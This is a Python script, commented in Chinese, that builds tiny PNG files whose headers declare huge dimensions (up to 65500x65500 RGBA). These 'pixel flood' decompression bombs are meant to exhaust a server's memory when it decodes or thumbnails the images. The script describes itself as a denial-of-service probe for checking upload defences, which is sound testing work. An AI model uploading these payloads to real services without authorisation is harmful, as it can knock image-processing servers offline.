# -*- coding: utf-8 -*-
"""
generate_payloads.py
生成 DoS 安全探测所需的二进制 payload —— 图像"解压炸弹/像素洪水"(pixel-flood) PNG。

原理：
  PNG 的 IHDR 里声明了图片宽高。很多服务端在生成缩略图 / 校验图片时，会先按
  宽*高*通道 预分配内存位图。若声明一个极大尺寸（如 50000x50000 = 25 亿像素 ≈ 10GB
  RGBA），而文件本身只有几十字节，解码方若没有"解压炸弹保护"就会瞬间 OOM / 卡死。
  Pillow 默认 MAX_IMAGE_PIXELS≈8900万，超出即抛 DecompressionBombError —— 这正是
  我们要在服务端验证的防护。

  该文件不含任何可执行代码，纯粹是一个"尺寸很大但体积很小"的合法 PNG 头，
  属于安全探测：只上传单个文件，不打并发、不上传大体积文件。

用法：  python generate_payloads.py
输出：  ./pixelflood.png       (50000x50000 声明尺寸)
        ./pixelflood_big.png   (65500x65500 声明尺寸，二次探测)
"""
import struct
import zlib
import os

HERE = os.path.dirname(os.path.abspath(__file__))


def _chunk(chunk_type: bytes, data: bytes) -> bytes:
    body = chunk_type + data
    crc = zlib.crc32(body) & 0xFFFFFFFF
    return struct.pack('>I', len(data)) + body + struct.pack('>I', crc)


def make_pixelflood(path: str, width: int, height: int) -> int:
    """生成一个声明尺寸为 width x height 的最小合法 PNG（8-bit RGBA）。"""
    sig = b'\x89PNG\r\n\x1a\n'
    # IHDR: width, height, bitDepth=8, colorType=6(RGBA), compression=0, filter=0, interlace=0
    ihdr = struct.pack('>IIBBBBB', width, height, 8, 6, 0, 0, 0)
    # 极小的 IDAT：只压缩几个字节。真正的图像数据远小于声明尺寸，
    # 但"先按 IHDR 尺寸预分配位图"的解码器在读到这里之前就已经爆内存了。
    idat = zlib.compress(b'\x00' * 16, 9)
    png = sig + _chunk(b'IHDR', ihdr) + _chunk(b'IDAT', idat) + _chunk(b'IEND', b'')
    with open(path, 'wb') as f:
        f.write(png)
    return len(png)


def main():
    targets = [
        ('pixelflood.png', 50000, 50000),     # 25 亿像素 ≈ 10GB RGBA
        ('pixelflood_big.png', 65500, 65500),  # 42 亿像素 ≈ 17GB RGBA
    ]
    for name, w, h in targets:
        path = os.path.join(HERE, name)
        size = make_pixelflood(path, w, h)
        px = w * h
        print(f'[OK] {name}: 声明尺寸 {w}x{h} ({px/1e8:.1f} 亿像素, 解码约 {px*4/1e9:.1f}GB), 文件仅 {size} 字节')


if __name__ == '__main__':
    main()
